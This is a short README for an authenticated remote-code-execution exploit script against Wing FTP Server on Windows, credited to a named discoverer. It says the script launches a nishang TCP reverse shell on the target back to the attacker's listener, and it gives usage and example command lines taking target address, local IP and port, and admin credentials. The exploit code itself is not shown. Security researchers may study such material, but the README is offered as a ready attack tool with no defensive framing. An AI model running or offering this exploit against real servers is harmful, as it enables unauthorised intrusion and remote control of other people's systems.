# Wing-FTP-RCE Authenticated
This is a Python3 exploit for the Wing FTP Server running on Windows that requires admin panel authentication.

## About the vulnerability
This exploit was discovered by Alex Haynes.

## How to run:
This exploit will invoke a nishang tcp reverse shell on the target. Start your listener before executing.
#Usage:
```
final.py <TARGET> <TARGET_PORT> <LOCAL_IP> <LOCAL_PORT> <USER> <PASSWORD>
```
#Example:
```
final.py 0.0.0.0 8000 127.0.0.1 9001 notcos coolpass
```
